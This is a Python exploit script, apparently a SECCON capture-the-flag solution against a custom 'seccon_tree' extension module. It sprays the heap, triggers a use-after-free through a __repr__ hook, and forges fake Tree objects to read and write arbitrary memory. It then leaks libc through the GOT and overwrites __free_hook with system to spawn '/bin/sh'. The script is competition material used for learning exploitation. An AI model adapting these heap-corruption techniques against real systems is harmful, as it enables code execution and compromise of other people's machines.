from seccon_tree import Tree

# Debug utility
seccon_print = print
seccon_bytes = bytes
seccon_id = id
seccon_range = range
seccon_hex = hex
seccon_bytearray = bytearray
class seccon_util(object):
    def DebugPrint(self, *l):
        seccon_print(*l)
    def DebugBytes(self, o):
        return seccon_bytes(o)
    def DebugId(self, o):
        return seccon_id(o)
    def DebugRange(self, *l):
        return seccon_range(*l)
    def DebugHex(self, o):
        return seccon_hex(o)
    def DebugBytearray(self, o):
        return seccon_bytearray(o)

dbg = seccon_util()

# Disallow everything
#for key in dir(__builtins__):
#    del __builtins__.__dict__[key]
#del __builtins__


def print(*l):
    return dbg.DebugPrint(*l)
def bytes(x):
    return dbg.DebugBytes(x)
def id(x):
    return dbg.DebugId(x)
def range(*argv):
    return dbg.DebugRange(*argv)
def hex(x):
    return dbg.DebugHex(x)
def bytearray(x):
    return dbg.DebugBytearray(x)

def p64(n):
    result = []
    for i in range(0, 64, 8): result.append((n>>i)&0xff)
    return bytes(result)

def u64(n):
    res = 0
    for x in n[::-1]: res = (res<<8) | x
    return res

def pa(x, comment=""):
    print(comment, hex(id(x)))


KEY = "KEY"

target_bytes = p64(0x100) + p64(id(bytearray(b"x").__class__)) +p64(0x7fffffffffffffff) + p64(0) * 4
target_bytes_addr = id(target_bytes) + 0x20
pa(target_bytes, "target bytes")

spray = [Tree(1) for i in range(100)]

a = Tree("a")
b = Tree("b")
a.add_child_left(b)

d = Tree("d")
e = Tree("e")
d.add_child_left(e)

base_addr = id(spray[-1])
pa(spray[-1], "spray")
pa(b, "object b")
e_addr = id(e)
pa(e, "object e")
del e

def get_fake_tree(obj, left, right):
    return bytearray(p64(0x100) +  \
         p64(id(Tree)) + \
         p64(obj)    +  \
         p64(left) + p64(right)[:-1])
dummy = Tree(1)
def evil(x):
    # fake_tree_2's buf == e
    spray = [Tree(1) for i in range(100)]
    d.add_child_left(dummy)
    dbg.fake_tree_2 = get_fake_tree(id(KEY), 0xcafe,0xbabe)
    pa(dbg.fake_tree_2, "fake_tree_2")

    # fake_tree's buf == b
    spray2 = [Tree(1) for i in range(100)]
    a.add_child_left(Tree(1))
    dbg.fake_tree = get_fake_tree(0xdead, 0xbeef, e_addr)
    pa(dbg.fake_tree, "fake_tree")
    #input("wait for attach")

    return "evil"

dbg.__class__.__repr__ = evil
h = dbg
c = Tree(h)
b.add_child_left(c)
del b
x = a.find(KEY)
dbg.fake_tree_2[16:24] = p64(target_bytes_addr)
p = x.get_object()

stack_check_fail_got = id(Tree) - 0x1e0
print(p[stack_check_fail_got:stack_check_fail_got+8])
x = u64(p[stack_check_fail_got:stack_check_fail_got+8])
print(hex(x))
#input("wait for attach")
libc_base = x - 0x132b00

free_hook = libc_base + 0x1eeb28
system = libc_base + 0x55410
p[free_hook:free_hook+8] = p64(system)
bytearray(b"/bin/sh\x00" * 400)


